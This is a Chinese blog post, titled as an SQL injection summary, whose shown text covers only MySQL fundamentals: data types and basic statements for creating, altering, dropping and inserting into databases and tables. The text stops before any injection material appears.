<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入总结(超详细) | B1ueL0n3's blog</title><meta name="author" content="B1ueL0n3"><meta name="copyright" content="B1ueL0n3"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="MySQL环境配置 定义MySQL为关系型数据库(Relational Database Management System), 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或数个表格组成, 如图所示的一个表格:   表头(header): 每一列的名称。  列(col): 具有相同数据类型的数据的集合。  行(row): 每一行用来描述某条记录的具体信息。  值(val">
<meta property="og:type" content="article">
<meta property="og:title" content="SQL注入总结(超详细)">
<meta property="og:url" content="https://b1uel0n3.github.io/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/index.html">
<meta property="og:site_name" content="B1ueL0n3&#39;s blog">
<meta property="og:description" content="MySQL环境配置 定义MySQL为关系型数据库(Relational Database Management System), 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或数个表格组成, 如图所示的一个表格:   表头(header): 每一列的名称。  列(col): 具有相同数据类型的数据的集合。  行(row): 每一行用来描述某条记录的具体信息。  值(val">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://b1uel0n3.github.io/img/6.jpg">
<meta property="article:published_time" content="2025-04-24T13:20:56.000Z">
<meta property="article:modified_time" content="2025-05-28T14:02:01.604Z">
<meta property="article:author" content="B1ueL0n3">
<meta property="article:tag" content="SQL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://b1uel0n3.github.io/img/6.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "SQL注入总结(超详细)",
  "url": "https://b1uel0n3.github.io/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/",
  "image": "https://b1uel0n3.github.io/img/6.jpg",
  "datePublished": "2025-04-24T13:20:56.000Z",
  "dateModified": "2025-05-28T14:02:01.604Z",
  "author": [
    {
      "@type": "Person",
      "name": "B1ueL0n3",
      "url": "https://b1uel0n3.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/toux.jpg"><link rel="canonical" href="https://b1uel0n3.github.io/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'SQL注入总结(超详细)',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/custom.css"><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/toux.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">25</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/16.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/" title="回到主页"><span class="site-name">B1ueL0n3's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入总结(超详细)</span></a><!--鼠标下滑时的文章标题显示--></span><div class="mask-name-container"><center id="name-container"><a id="page-name" href="javascript:btf.scrollToDest(0, 500)"></a></center></div><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入总结(超详细)</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-24T13:20:56.000Z" title="发表于 2025-04-24 21:20:56">2025-04-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-05-28T14:02:01.604Z" title="更新于 2025-05-28 22:02:01">2025-05-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/">Web</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQL/">SQL</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">23.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>92分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a><strong>环境配置</strong></h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ%E6%88%AA%E5%9B%BE20231218174435.png"></p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a><strong>定义</strong></h3><p><strong>MySQL</strong>为关系型数据库(Relational Database Management System), 这种所谓的”关系型”可以理解为”表格”的概念, 一个关系型数据库由一个或<strong>数个表格</strong>组成, 如图所示的一个表格:</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ%E6%88%AA%E5%9B%BE20231218175654.png"></p>
<ul>
<li><p><strong>表头</strong>(header): 每一列的名称。</p>
</li>
<li><p><strong>列</strong>(col): 具有相同数据类型的数据的集合。</p>
</li>
<li><p><strong>行</strong>(row): 每一行用来描述某条记录的具体信息。</p>
</li>
<li><p><strong>值</strong>(value): 行的具体信息, 每个值必须与该列的数据类型相同。</p>
</li>
<li><p><strong>键(key)</strong>: 键的值在当前列中具有唯一性。</p>
</li>
</ul>
<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h4><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">大小</th>
<th align="left">范围（有符号）</th>
<th align="left">范围（无符号）</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">TINYINT</td>
<td align="left">1 Bytes</td>
<td align="left">(-128，127)</td>
<td align="left">(0，255)</td>
<td align="left">小整数值</td>
</tr>
<tr>
<td align="left">SMALLINT</td>
<td align="left">2 Bytes</td>
<td align="left">(-32 768，32 767)</td>
<td align="left">(0，65 535)</td>
<td align="left">大整数值</td>
</tr>
<tr>
<td align="left">MEDIUMINT</td>
<td align="left">3 Bytes</td>
<td align="left">(-8 388 608，8 388 607)</td>
<td align="left">(0，16 777 215)</td>
<td align="left">大整数值</td>
</tr>
<tr>
<td align="left">INT或INTEGER</td>
<td align="left">4 Bytes</td>
<td align="left">(-2 147 483 648，2 147 483 647)</td>
<td align="left">(0，4 294 967 295)</td>
<td align="left">大整数值</td>
</tr>
<tr>
<td align="left">BIGINT</td>
<td align="left">8 Bytes</td>
<td align="left">(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td>
<td align="left">(0，18 446 744 073 709 551 615)</td>
<td align="left">极大整数值</td>
</tr>
<tr>
<td align="left">FLOAT</td>
<td align="left">4 Bytes</td>
<td align="left">(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td>
<td align="left">0，(1.175 494 351 E-38，3.402 823 466 E+38)</td>
<td align="left">单精度 浮点数值</td>
</tr>
<tr>
<td align="left">DOUBLE</td>
<td align="left">8 Bytes</td>
<td align="left">(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
<td align="left">0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td>
<td align="left">双精度 浮点数值</td>
</tr>
<tr>
<td align="left">DECIMAL</td>
<td align="left">对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td>
<td align="left">依赖于M和D的值</td>
<td align="left">依赖于M和D的值</td>
<td align="left">小数值</td>
</tr>
</tbody></table>
<h4 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h4><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">大小 ( bytes)</th>
<th align="left">范围</th>
<th align="left">格式</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">DATE</td>
<td align="left">3</td>
<td align="left">1000-01-01&#x2F;9999-12-31</td>
<td align="left">YYYY-MM-DD</td>
<td align="left">日期值</td>
</tr>
<tr>
<td align="left">TIME</td>
<td align="left">3</td>
<td align="left">‘-838:59:59’&#x2F;‘838:59:59’</td>
<td align="left">HH:MM:SS</td>
<td align="left">时间值或持续时间</td>
</tr>
<tr>
<td align="left">YEAR</td>
<td align="left">1</td>
<td align="left">1901&#x2F;2155</td>
<td align="left">YYYY</td>
<td align="left">年份值</td>
</tr>
<tr>
<td align="left">DATETIME</td>
<td align="left">8</td>
<td align="left">‘1000-01-01 00:00:00’ 到 ‘9999-12-31 23:59:59’</td>
<td align="left">YYYY-MM-DD hh:mm:ss</td>
<td align="left">混合日期和时间值</td>
</tr>
<tr>
<td align="left">TIMESTAMP</td>
<td align="left">4</td>
<td align="left">‘1970-01-01 00:00:01’ UTC 到 ‘2038-01-19 03:14:07’ UTC结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td>
<td align="left">YYYY-MM-DD hh:mm:ss</td>
<td align="left">混合日期和时间值，时间戳</td>
</tr>
</tbody></table>
<h4 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h4><table>
<thead>
<tr>
<th align="left">类型</th>
<th align="left">大小</th>
<th align="left">用途</th>
</tr>
</thead>
<tbody><tr>
<td align="left">CHAR</td>
<td align="left">0-255 bytes</td>
<td align="left">定长字符串</td>
</tr>
<tr>
<td align="left">VARCHAR</td>
<td align="left">0-65535 bytes</td>
<td align="left">变长字符串</td>
</tr>
<tr>
<td align="left">TINYBLOB</td>
<td align="left">0-255 bytes</td>
<td align="left">不超过 255 个字符的二进制字符串</td>
</tr>
<tr>
<td align="left">TINYTEXT</td>
<td align="left">0-255 bytes</td>
<td align="left">短文本字符串</td>
</tr>
<tr>
<td align="left">BLOB</td>
<td align="left">0-65 535 bytes</td>
<td align="left">二进制形式的长文本数据</td>
</tr>
<tr>
<td align="left">TEXT</td>
<td align="left">0-65 535 bytes</td>
<td align="left">长文本数据</td>
</tr>
<tr>
<td align="left">MEDIUMBLOB</td>
<td align="left">0-16 777 215 bytes</td>
<td align="left">二进制形式的中等长度文本数据</td>
</tr>
<tr>
<td align="left">MEDIUMTEXT</td>
<td align="left">0-16 777 215 bytes</td>
<td align="left">中等长度文本数据</td>
</tr>
<tr>
<td align="left">LONGBLOB</td>
<td align="left">0-4 294 967 295 bytes</td>
<td align="left">二进制形式的极大文本数据</td>
</tr>
<tr>
<td align="left">LONGTEXT</td>
<td align="left">0-4 294 967 295 bytes</td>
<td align="left">极大文本数据</td>
</tr>
</tbody></table>
<blockquote>
<p>char(n) 和 varchar(n) 中括号中 n 代表字符的个数，并不代表字节个数，比如 CHAR(30) 就可以存储 30 个字符。</p>
</blockquote>
<h4 id="枚举与集合类型（Enumeration-and-Set-Types）"><a href="#枚举与集合类型（Enumeration-and-Set-Types）" class="headerlink" title="枚举与集合类型（Enumeration and Set Types）"></a>枚举与集合类型（Enumeration and Set Types）</h4><ul>
<li><strong>ENUM</strong>: 枚举类型，用于存储单一值，可以选择一个预定义的集合。</li>
<li><strong>SET</strong>: 集合类型，用于存储多个值，可以选择多个预定义的集合。</li>
</ul>
<h3 id="库操作"><a href="#库操作" class="headerlink" title="库操作"></a>库操作</h3><ul>
<li><p><strong>创建数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> DATABASE 数据库名;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> database 数据库名;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>删除数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> DATABASE <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;        <span class="operator">/</span><span class="operator">/</span> 直接删除数据库，不检查是否存在</span><br><span class="line"></span><br><span class="line"><span class="keyword">DROP</span> DATABASE [IF <span class="keyword">EXISTS</span>] <span class="operator">&lt;</span>database_name<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>修改数据库</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> database<span class="operator">|</span>schema db_name</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="表操作"><a href="#表操作" class="headerlink" title="表操作"></a>表操作</h3><h4 id="表约束"><a href="#表约束" class="headerlink" title="表约束"></a>表约束</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> users (</span><br><span class="line">    id <span class="type">INT</span> AUTO_INCREMENT <span class="keyword">PRIMARY KEY</span>,</span><br><span class="line">    username <span class="type">VARCHAR</span>(<span class="number">50</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    email <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT NULL</span>,</span><br><span class="line">    seat <span class="type">INT</span> <span class="keyword">UNIQUE</span>,</span><br><span class="line">    birthdate <span class="type">DATE</span>,</span><br><span class="line">    is_active <span class="type">BOOLEAN</span> <span class="keyword">DEFAULT</span> <span class="literal">TRUE</span>,</span><br><span class="line">    <span class="keyword">CONSTRAINT</span> fk <span class="keyword">FOREIGN KEY</span>(tid) <span class="keyword">REFERENCES</span> teachers(id)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>非空约束(not null)</strong></p>
<p>用not null约束的字段不能为null值，必须给定具体的数据</p>
</li>
<li><p><strong>唯一性约束(unique)</strong></p>
<p>unique约束的字段，具有唯一性，不可重复，但可以为null</p>
</li>
<li><p><strong>主键约束(primary key) PK</strong></p>
</li>
<li><p><strong>外键约束(foreign key)FK</strong></p>
<p>只能是表级定义（如以下例子）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreign key</span>(classno) <span class="keyword">references</span> t_class(cno)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>检查约束(目前MySQL不支持、Oracle支持)</strong></p>
</li>
</ul>
<h4 id="数据表管理"><a href="#数据表管理" class="headerlink" title="数据表管理"></a>数据表管理</h4><ul>
<li><p><strong>创建表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> table_name (</span><br><span class="line">    column1 datatype,</span><br><span class="line">    column2 datatype,</span><br><span class="line">    ...</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>修改表</strong></p>
<ul>
<li><p><strong>add</strong></p>
<p><strong>用于增加新字段和完整型约束</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span> <span class="keyword">add</span> <span class="operator">&lt;</span>新表名<span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>first和after</strong>为可选项，分别用于将新添加的字段设置为表的第一个字段和将添加的字段添加到指定的”已有字段名”之后</p>
<p><strong>添加多个字段要用括号括起来</strong></p>
</blockquote>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> s</span><br><span class="line"><span class="keyword">add</span> class_no <span class="type">varchar</span>(<span class="number">6</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> s</span><br><span class="line"><span class="keyword">add</span> (class_no <span class="type">varchar</span>(<span class="number">6</span>),address nvarchar(<span class="number">20</span>));</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>rename</strong></p>
<p><strong>用于修改表名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line">rename <span class="operator">&lt;</span>新表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>change</strong></p>
<p><strong>用于修改字段名</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">change <span class="operator">&lt;</span>旧字段名<span class="operator">&gt;</span> <span class="operator">&lt;</span>新字段名<span class="operator">&gt;</span> <span class="operator">&lt;</span>新数据类型<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>modify</strong></p>
<p>用于<strong>修改字段数据类型和字段排序</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">modify <span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span> <span class="operator">&lt;</span>数据类型<span class="operator">&gt;</span> [<span class="keyword">first</span><span class="operator">|</span>after 字段名<span class="number">2</span>];</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>engine</strong></p>
<p>用于<strong>修改表的存储引擎</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span></span><br><span class="line">engine<span class="operator">=</span><span class="operator">&lt;</span>修改后存储引擎名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>drop</strong></p>
<p>用于<strong>删除字段和完整型约束</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="operator">&lt;</span>字段名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter table</span> <span class="operator">&lt;</span>旧表名<span class="operator">&gt;</span></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">CONSTRAINT</span> <span class="operator">&lt;</span>约束名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>删除表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查看表</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">describe</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>;  <span class="operator">/</span><span class="operator">/</span>查看表结构</span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="表中数据操纵"><a href="#表中数据操纵" class="headerlink" title="表中数据操纵"></a>表中数据操纵</h4><ul>
<li><p><strong>insert</strong></p>
<p>用于<strong>在表中添加一条新纪录</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> <span class="operator">&lt;</span>表名<span class="operator">&gt;</span>[(<span class="operator">&lt;</span>字段名<span class="number">1</span><span class="operator">&gt;</span>[,<span class="operator">&lt;</span>字段名<span class="number">2</span><span class="operator">&gt;</span>...])] <span class="keyword">values</span>(<span class="operator">&lt;</span>值<span class="operator">&gt;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span><span class="operator">|</span>replace <span class="keyword">into</span> s(sno,sn,age)</span><br><span class="line"><span class="keyword">values</span>(<span class="string">&#x27;s9&#x27;</span>,<span class="string">&#x27;小明&#x27;</span>,<span class="number">21</span>);</span><br></pre></td></tr></table></figure>

